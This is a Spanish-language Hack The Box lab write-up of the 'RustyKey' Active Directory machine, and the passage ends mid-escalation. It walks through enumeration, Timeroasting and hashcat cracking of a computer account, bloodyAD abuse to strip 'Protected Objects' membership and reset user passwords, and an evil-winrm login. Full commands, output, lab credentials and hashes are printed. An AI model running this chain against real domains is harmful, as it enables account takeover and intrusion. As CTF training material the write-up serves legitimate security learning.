---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# RustyKey HackTheBox (Hard)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 15:56 PDT
Nmap scan report for 10.10.11.75
Host is up (0.031s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-14 23:08:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49738/tcp open  msrpc         Microsoft Windows RPC
59660/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-14T23:09:35
|_  start_date: N/A
|_clock-skew: 11m33s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.93 seconds
```

Veremos varios puertos, pero entre ellos los que mas nos interesan son el `LDAP, WinRM, SMB, etc...` tambien si nos vamos a la informacion de la maquina de `HTB` veremos que nos proporcionan unas credenciales como en un pentesting real.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-14 171111.png" alt=""><figcaption></figcaption></figure>

```
User: rr.parker
Pass: 8#t5HE8L!W3A
```

Vemos un dominio en el reporte de `namp` llamado `rustykey.htb` y veremos que el `DC` se llama como tal `DC`, por lo que vamos añadir a nuestro archivo `hosts` lo siguiente:

```shell
nano /etc/hosts

#Dentro del nano
<IP>          rustykey.htb dc.rustykey.htb
```

Lo guardamos y vamos a probar a realizar un poco de `fuzzing` por `SMB` a ver que vemos.

Pero tendremos antes que configurar la `time zone` con el del `DC` osea el del `dominio` como tal, esto se puede conseguir poniendo en cada comando que se vaya a utilizar la conexion del `DC` el `ntpdate` junto con el `dominio`, en este caso lo vamos a utilizar para obtener el `TGT` del usuario `rr.parker` ya que de normal las credenciales no van, requiere de autenticacion mediante `kerberos` con el `TGT`.

```shell
ntpdate rustykey.htb ; impacket-getTGT rustykey.htb/'rr.parker':'8#t5HE8L!W3A'
```

Info:

```
2025-10-14 16:16:11.916372 (-0700) +734.500868 +/- 0.496514 rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 734.500868
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in rr.parker.ccache
```

Ahora nos exportaremos dicho archivo generado en la variable de `kerberos` para que nos funcione cuando vayamos a lanzar un comando autenticado por dicho usuario.

```shell
export KRB5CCNAME=rr.parker.ccache
```

Echo esto vamos a listar los recursos compartidos que tiene el usuario en `SMB` a ver si funciona ahora.

```shell
ntpdate rustykey.htb ; netexec smb dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --shares
```

Info:

```
2025-10-14 16:17:33.072222 (-0700) +7.633336 +/- 0.014220 rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 7.633336
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
SMB         dc.rustykey.htb 445    dc               [*] Enumerated shares
SMB         dc.rustykey.htb 445    dc               Share           Permissions     Remark
SMB         dc.rustykey.htb 445    dc               -----           -----------     ------
SMB         dc.rustykey.htb 445    dc               ADMIN$                          Remote Admin
SMB         dc.rustykey.htb 445    dc               C$                              Default share
SMB         dc.rustykey.htb 445    dc               IPC$            READ            Remote IPC
SMB         dc.rustykey.htb 445    dc               NETLOGON        READ            Logon server share 
SMB         dc.rustykey.htb 445    dc               SYSVOL          READ            Logon server share
```

Veremos que ha funcionado, pero no veremos nada interesante de recursos, por lo menos sabemos que la autenticacion funciona, por lo que vamos a descargarnos un `ZIP` de `BloodHound` para poder visualizar los privilegios de los usuarios y todo el árbol en general del `AD`.

```shell
ntpdate rustykey.htb ; bloodhound-python -u rr.parker -p '8#t5HE8L!W3A' -ns <IP> -c All -d rustykey.htb --zip
```

Info:

```
2025-10-14 16:23:18.581813 (-0700) +34.552617 +/- 0.013773 rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 34.552617
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: rustykey.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 16 computers
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 12 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: dc.rustykey.htb
INFO: Done in 00M 06S
INFO: Compressing output into 20251014162319_bloodhound.zip
```

## BloodHound

Ahora vamos a instalar `BloodHound` de forma rapida en un `docker`:

URL = [Download BloodHound en Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```shell
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

Info:

```
..............................<RESTO DE INFO>......................................
Container bloodhound-graph-db-1  Creating
 Container bloodhound-app-db-1  Creating
 Container bloodhound-graph-db-1  Created
 Container bloodhound-app-db-1  Created
 Container bloodhound-bloodhound-1  Creating
 Container bloodhound-bloodhound-1  Created
 Container bloodhound-app-db-1  Starting
 Container bloodhound-graph-db-1  Starting
 Container bloodhound-app-db-1  Started
 Container bloodhound-graph-db-1  Started
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-graph-db-1  Healthy
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-bloodhound-1  Starting
 Container bloodhound-bloodhound-1  Started
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Ahora que esta importado en nuestro `docker` y levantado podremos acceder a el desde la siguiente `URL`.

```
URL = http://127.0.0.1:8080/ui/login
```

Nos logueamos con las credenciales propocionadas por la herramienta, entrando nos pedira cambiar las credenciales y ya nos metera dentro:

```
User: admin
Pass: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
```

Una vez dentro vamos a importar el `.zip` y tendremos que esperar un poco a que cargue todos los datos, despues cuando vayamos al `dashboard` principal veremos todos los datos, vamos a investigar el usuario `rr.parker` a ver que tiene.

Pero no veremos nada interesante de dicho usuario, despues de buscar informacion y estar un rato investigando, podemos probar una tecnica llamada `Timeroasting`, consiste en lo siguiente:

```
1. El objetivo debe ser una cuenta de equipo; las cuentas de usuario comunes no pueden ser atacadas directamente (a menos que "Target Timeroasting" modifique sus propiedades).
2. El controlador de dominio objetivo debe tener el servicio NTP ejecutándose y respondiendo con la autenticación extendida SNTP de Microsoft (MS-SNTP), con el puerto UDP 123 abierto.
3. El atacante puede enviar solicitudes MS-SNTP no autenticadas al controlador de dominio (sin credenciales válidas).
4. El atacante puede enumerar los RID (identificadores relativos) de las cuentas de equipo en el dominio.
5. (Opcional) Para "Target Timeroasting", se requieren privilegios de administrador de dominio para modificar temporalmente las propiedades de la cuenta de usuario y tratarla como una cuenta de equipo.
6. Las contraseñas de las cuentas de equipo en el dominio no están bien protegidas (por ejemplo, contraseñas débiles o no se cambian con regularidad).
```

Vamos a listar los ususarios para tener algunos identificados antes.

```shell
ntpdate rustykey.htb ;  netexec ldap dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k --users
```

Info:

```
2025-10-15 10:37:15.501040 (-0700) +73.415038 +/- 0.025996 rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 73.415038
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
LDAP        dc.rustykey.htb 389    DC               [*] Enumerated 11 domain users: rustykey.htb
LDAP        dc.rustykey.htb 389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                 
LDAP        dc.rustykey.htb 389    DC               Administrator                 2025-06-04 15:52:22 0        Built-in account for administering the computer/domain
LDAP        dc.rustykey.htb 389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        dc.rustykey.htb 389    DC               krbtgt                        2024-12-26 16:53:40 0        Key Distribution Center Service Account       
LDAP        dc.rustykey.htb 389    DC               rr.parker                     2025-06-04 15:54:15 0                                                      
LDAP        dc.rustykey.htb 389    DC               mm.turner                     2024-12-27 02:18:39 0                                                      
LDAP        dc.rustykey.htb 389    DC               bb.morgan                     2025-10-15 10:31:40 0                                                      
LDAP        dc.rustykey.htb 389    DC               gg.anderson                   2025-10-15 10:31:40 0                                                      
LDAP        dc.rustykey.htb 389    DC               dd.ali                        2025-10-15 10:31:40 0                                                      
LDAP        dc.rustykey.htb 389    DC               ee.reed                       2025-10-15 10:31:40 0                                                      
LDAP        dc.rustykey.htb 389    DC               nn.marcos                     2024-12-27 03:34:50 0                                                      
LDAP        dc.rustykey.htb 389    DC               backupadmin                   2024-12-29 16:30:18 0
```

Y con esto las computadoras del dominio.

```shell
ntpdate rustykey.htb ; netexec ldap dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k --computers
```

Info:

```
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
LDAP        dc.rustykey.htb 389    DC               [*] Total records returned: 16
LDAP        dc.rustykey.htb 389    DC               DC$
LDAP        dc.rustykey.htb 389    DC               Support-Computer1$
LDAP        dc.rustykey.htb 389    DC               Support-Computer2$
LDAP        dc.rustykey.htb 389    DC               Support-Computer3$
LDAP        dc.rustykey.htb 389    DC               Support-Computer4$
LDAP        dc.rustykey.htb 389    DC               Support-Computer5$
LDAP        dc.rustykey.htb 389    DC               Finance-Computer1$
LDAP        dc.rustykey.htb 389    DC               Finance-Computer2$
LDAP        dc.rustykey.htb 389    DC               Finance-Computer3$
LDAP        dc.rustykey.htb 389    DC               Finance-Computer4$
LDAP        dc.rustykey.htb 389    DC               Finance-Computer5$
LDAP        dc.rustykey.htb 389    DC               IT-Computer1$
LDAP        dc.rustykey.htb 389    DC               IT-Computer2$
LDAP        dc.rustykey.htb 389    DC               IT-Computer3$
LDAP        dc.rustykey.htb 389    DC               IT-Computer4$
LDAP        dc.rustykey.htb 389    DC               IT-Computer5$
```

## Timeroasting

Veremos algunos interesantes, pero de momento por conocimiento los dejaremos ahi sabiendo que son esos usuarios los que hay en el dominio, ahora vamos a poner en practica la tecnica `Timeroasting`.

URL = [GitHub herramienta timeroast.py](https://github.com/SecuraBV/Timeroast)

```shell
git clone https://github.com/SecuraBV/Timeroast.git
cd Timeroast/
python3 timeroast.py dc.rustykey.htb
```

Info:

```
1000:$sntp-ms$00e753b5ef8d570096df028e1d732d4c$1c0111e900000000000a3c134c4f434cec9a0bb86857fd17e1b8428bffbfcd0aec9a5aeb9088fbbcec9a5aeb9089316c
1103:$sntp-ms$db045a296f31de58252dbe964fd77745$1c0111e900000000000a3c134c4f434cec9a0bb86aeec7c9e1b8428bffbfcd0aec9a5aec3b0f6e32ec9a5aec3b0f99d0
1104:$sntp-ms$abebd502023e903ecc480702e1f07670$1c0111e900000000000a3c134c4f434cec9a0bb8689a5805e1b8428bffbfcd0aec9a5aec3c920550ec9a5aec3c9235f8
1105:$sntp-ms$4807df7ade772dd37bc9e808f98e058b$1c0111e900000000000a3c134c4f434cec9a0bb86a6f8924e1b8428bffbfcd0aec9a5aec3e673167ec9a5aec3e6768c4
1106:$sntp-ms$5185accae5ec60a304186d895746d6c4$1c0111e900000000000a3c134c4f434cec9a0bb868189bd8e1b8428bffbfcd0aec9a5aec4028d0d9ec9a5aec40291aab
1107:$sntp-ms$9c2d56ee66956f9efb2f396ff122b92d$1c0111e900000000000a3c134c4f434cec9a0bb869a06713e1b8428bffbfcd0aec9a5aec41b0a980ec9a5aec41b0d6cd
1118:$sntp-ms$5d4d7479161f58dec8e96d5dda55a2ff$1c0111e900000000000a3c134c4f434cec9a0bb8682b536ae1b8428bffbfcd0aec9a5aec505c5c21ec9a5aec505c8465
1119:$sntp-ms$6caab31558a530400ff88a58c6a9fe0c$1c0111e900000000000a3c134c4f434cec9a0bb869e9aa53e1b8428bffbfcd0aec9a5aec521a9b8cec9a5aec521ae3b1
1120:$sntp-ms$e3052af7c52ed0c599370da866331b78$1c0111e900000000000a3c134c4f434cec9a0bb86b6c24ece1b8428bffbfcd0aec9a5aec539d2036ec9a5aec539d6352
1121:$sntp-ms$732f0346d2a229525a05f3a63c45fa77$1c0111e900000000000a3c134c4f434cec9a0bb8697219f8e1b8428bffbfcd0aec9a5aec557a1214ec9a5aec557a588b
1122:$sntp-ms$478ffe349593b4032fe328b31a52a34e$1c0111e900000000000a3c134c4f434cec9a0bb86b0b5096e1b8428bffbfcd0aec9a5aec57135115ec9a5aec57138f28
1123:$sntp-ms$be794ecadcf15aff80abb49dd3f6421b$1c0111e900000000000a3c134c4f434cec9a0bb868601bc9e1b8428bffbfcd0aec9a5aec5880c8e8ec9a5aec5880ea76
1124:$sntp-ms$d08d5b92cc4203de2960b87db1734b0a$1c0111e900000000000a3c134c4f434cec9a0bb869e4c1b6e1b8428bffbfcd0aec9a5aec5a055fbbec9a5aec5a05956b
1125:$sntp-ms$96d19e3d81b823ba8856ef4aaff4802b$1c0111e900000000000a3c134c4f434cec9a0bb869e716fae1b8428bffbfcd0aec9a5aec5a07bf11ec9a5aec5a07e3fa
1126:$sntp-ms$c5f944230b38586b42af4b28e03b6cb3$1c0111e900000000000a3c134c4f434cec9a0bb86b6adc16e1b8428bffbfcd0aec9a5aec5b8b7366ec9a5aec5b8bae1e
1127:$sntp-ms$d1093924f083dd86ae2afc8360abc1cc$1c0111e900000000000a3c134c4f434cec9a0bb869202b18e1b8428bffbfcd0aec9a5aec5d17da11ec9a5aec5d18090b
```

Veremos que nos ha sacado unos cuantos `hashes` de forma correcta, por lo que vamos a probar a ver cuales podremos `crackear` con `hashcat` en la version `BETA`, de esta forma:

> hashes.txt

```
........................<HASHES OBTENIDOS ANTERIORMENTE>...........................
```

URL = [Ultima version Hashcat BETA](https://hashcat.net/files/hashcat-7.1.2.7z)

```shell
./hashcat.bin -a 0 -m 31300 hashes.txt <WORDLIST>
```

Info:

```
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-13th Gen Intel(R) Core(TM) i7-13620H, 2090/4181 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 16 digests; 16 unique digests, 16 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (1523 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$sntp-ms$96d19e3d81b823ba8856ef4aaff4802b$1c0111e900000000000a3c134c4f434cec9a0bb869e716fae1b8428bffbfcd0aec9a5aec5a07bf11ec9a5aec5a07e3fa:Rusty88!
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 31300 (MS SNTP)
Hash.Target......: ../hashes.txt
Time.Started.....: Wed Oct 15 10:46:50 2025 (18 secs)
Time.Estimated...: Wed Oct 15 10:47:08 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........: 13405.6 kH/s (0.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/16 (6.25%) Digests (total), 1/16 (6.25%) Digests (new), 1/16 (6.25%) Salts
Progress.........: 229510160/229510160 (100.00%)
Rejected.........: 0/229510160 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:15 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 47%

Started: Wed Oct 15 10:46:34 2025
Stopped: Wed Oct 15 10:47:09 2025
```

Veremos que ha funcionado y nos saca una contraseña solamente llamada `Rusty88!`, y si comparamos ese `hash` con la informacion que obtuvimos en la tecnica de `Timeroasting` veremos que se corresponde con el `SID` terminado en `1125` por lo que nos iremos a `BloodHound` y filtraremos por dicho `RID` del `SID` obtenido para saber el usuario que es.

## Escalate user BB.MORGAN

Si buscamos por `1125` en el buscador de `BloodHound` nos aparecera este equipo con dicho identificador:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-15 113318 (1).png" alt=""><figcaption></figcaption></figure>

Y este equipo tiene estos privilegios asociados de `AddSelf` al grupo llamado `HELPDESK`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-15 113259 (1).png" alt=""><figcaption></figcaption></figure>

Con estos privilegios y sabiendo que tenemos la contraseña de dicho equipo, podremos utilizar su autenticacion aprovechando estos privilegios respecto a dicho grupo.

Y desde ese grupo vemos que tenemos estos privilegios a estos usuarios del dominio:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-15 120556.png" alt=""><figcaption></figcaption></figure>

Vamos a utilizar la herramienta `bloodyAD` para realizar todo esto, primero vamos añadirnos con la maquina `IT-COMPUTER3` al grupo de `HELPDESK` ya que tenemos los privilegios para ello.

URL = [GitHub Herramienta BloodyAD](https://github.com/CravateRouge/bloodyAD)

```shell
git clone https://github.com/CravateRouge/bloodyAD.git
cd bloodyAD/
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Ahora antes de ejecutar la herramienta, vamos a generar un `TGT` del equipo `IT-COMPUTER3` para podernos autenticar desde `kerberos` y que no de error.

```shell
ntpdate rustykey.htb ; impacket-getTGT rustykey.htb/'IT-COMPUTER3':'Rusty88!'
```

Info:

```
2025-10-15 11:13:16.526978 (-0700) +1.225498 +/- 0.013941 rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 1.225498
/home/kali/Desktop/rustykey/bloodyAD/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IT-COMPUTER3.ccache
```

Vamos a exportar la variable de `kerberos` para que podamos autenticarnos.

```shell
export KRB5CCNAME=IT-COMPUTER3.ccache
```

Una vez echo esto, en el archivo de `kerberos` vamos añadir el `dominio` de la maquina victima para que no haya problemas con el `KDC` del `DC` del `AD`.

```shell
sudo tee -a /etc/krb5.conf << 'EOF'
[libdefaults]
    default_realm = RUSTYKEY.HTB

[realms]
    RUSTYKEY.HTB = {
        kdc = dc.rustykey.htb
        admin_server = dc.rustykey.htb
    }

[domain_realm]
    .rustykey.htb = RUSTYKEY.HTB
    rustykey.htb = RUSTYKEY.HTB
EOF
```

Una vez añadido, vamos a ejecutar la herramienta de esta forma:

```shell
ntpdate rustykey.htb ; python3 bloodyAD.py -d rustykey.htb -u IT-COMPUTER3 -k --host dc.rustykey.htb add groupMember HELPDESK 'CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb'
```

Info:

```
2025-10-15 11:17:15.917363 (-0700) +3.081702 +/- 0.016037 rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 3.081702
[+] CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb added to HELPDESK
```

Ahora podremos forzar el cambio de contraseñas de dichos usuarios que vimos antes, pero el que mas nos interesa es el de `BB.MORGAN` que tiene lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-15 122619.png" alt=""><figcaption></figcaption></figure>

Veremos que esta dentro de un grupo antes llamado `PROTECTED OBJECTS` si intentamos cambiarle la contraseña veremos que no nos deja por alguna proteccion de este grupo, por lo que vamos a eliminarle de este grupo y posteriormente cambiarle la contraseña, ya despues de eso veremos que esta en el grupo `REMOTE MANAGEMENT USERS` por lo que nos podremos conectar por `WinRM` con dicho usuario.

### Eliminación del grupo PROTECTED OBJECTS

```shell
ntpdate rustykey.htb ; python3 bloodyAD.py -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'IT'
```

Info:

```
2025-10-15 11:31:34.757410 (-0700) +4.147917 +/- 0.014059 rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 4.147917
[+] IT removed from PROTECTED OBJECTS
```

### Cambio de contraseña del usuario BB.MORGAN

```shell
ntpdate rustykey.htb ; python3 bloodyAD.py -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'P@ssw0rd!'
```

Info:

```
2025-10-15 11:37:24.005034 (-0700) +0.944120 +/- 0.013643 rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 0.944120
[+] Password changed successfully!
```

Con esto veremos que cambiamos la contraseña del usuario `BB.MORGAN` de forma correcta por lo que vamos a solicitar el `TGT` del usuario con esta nueva contraseña.

```shell
ntpdate rustykey.htb ; impacket-getTGT rustykey.htb/'bb.morgan':'P@ssw0rd!'
```

Info:

```
2025-10-15 11:39:52.365273 (-0700) +14.837275 +/- 0.013892 rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 14.837275
/home/kali/Desktop/rustykey/bloodyAD/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in bb.morgan.ccache
```

Ahora exportaremos la variable de `kerberos` de esta forma:

```shell
export KRB5CCNAME=bb.morgan.ccache
```

Y con esto ya nos podremos conectar con dicho usuario por `WinRM` utilizando la autenticacion de `kerberos`.

### Evil-winrm

```shell
evil-winrm -i dc.rustykey.htb -u bb.morgan -r RUSTYKEY.HTB
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> whoami
rustykey\bb.morgan
```

Veremos que ya estaremos dentro con dicho usuario, por lo que vamos a leer la `flag` del usuario.

> user.txt

```
87ad4335f67304b8a6bd5e302ccf4e84
```

## Escalate user EE.REED

Si listamos el `Desktop` de dicho usuario veremos a parte de la `flag` este archivo `PDF` bastante interesante.

```
Directory: C:\Users\bb.morgan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/4/2025   9:15 AM           1976 internal.pdf
-ar---       10/15/2025   5:02 AM             34 user.txt
```

Nos lo vamos a descargar con la utilidad `download` del propio `evil-winrm`.

```powershell
download internal.pdf
```

Info:

```
Info: Downloading C:\Users\bb.morgan\Desktop\internal.pdf to internal.pdf
                                        
Info: Download successful!
```

Ahora si nos vamos a nuestra maquina atacante, veremos que esta nuestro archivo `PDF` vamos abrirlo a ver que contiene.

```shell
open internal.pdf
```

Info:

```
Internal Memo
From: bb.morgan@rustykey.htb
To: support-team@rustykey.htb
Subject: Support Group - Archiving Tool Access
Date: Mon, 10 Mar 2025 14:35:18 +0100
Hey team,
As part of the new Support utilities rollout, extended access has been temporarily granted to allow
testing and troubleshooting of file archiving features across shared workstations.
This is mainly to help streamline ticket resolution related to extraction/compression issues reported
by the Finance and IT teams. Some newer systems handle context menu actions differently, so
registry-level adjustments are expected during this phase.
A few notes:
- Please avoid making unrelated changes to system components while this access is active.
- This permission change is logged and will be rolled back once the archiving utility is confirmed
stable in all environments.
- Let DevOps know if you encounter access errors or missing shell actions.
Thanks,
BB Morgan
IT Department
Page 1
```

Esto significa que el grupo `SUPPORT` tiene el derecho de modificar el registro y puede probar funciones relacionadas con la compresión/descompresión.

Si investigamos este `grupo` en `BloodHound` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-15 131116.png" alt=""><figcaption></figcaption></figure>

Vemos que el usuario `EE.REED` pertenece a dicho grupo y recordemos que desde el usuario `IT-COMPUTER3` perteneciendo al grupo de `HELPDESK` podemos forzar le cambio de contraseña a dicho usuario, por lo que vamos ha realizar lo siguiente.

```shell
ntpdate rustykey.htb ; python3 bloodyAD.py -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed 'P@ssw0rd!'
```

Info:

```
2025-10-15 12:18:51.999577 (-0700) +3.851476 +/- 0.015355 rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 3.851476
[+] Password changed successfully!
```

Ahora habiendo cambiado la contraseña, vamos a solicitar un `TGT` de dicho usuario para tenerlo guardado de esta forma, pero nos dara error y esto puede ser por que tambien esta dentro del grupo `PROTECTED OBJECTS`, por lo que vamos a eliminarlo de esta forma:

```shell
ntpdate rustykey.htb ; python3 bloodyAD.py -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'SUPPORT'
```

Info:

```
2025-10-15 12:24:52.569627 (-0700) +22.714649 +/- 0.014279 rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 22.714649
[+] SUPPORT removed from PROTECTED OBJECTS
```

Ahora si solicitamos el `TGT` de nuevo:

```shell
ntpdate rustykey.htb ; impacket-getTGT rustykey.htb/'ee.reed':'P@ssw0rd!'
```

Info:

```
2025-10-15 12:25:13.429701 (-0700) +0.611923 +/- 0.014122 rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 0.611923
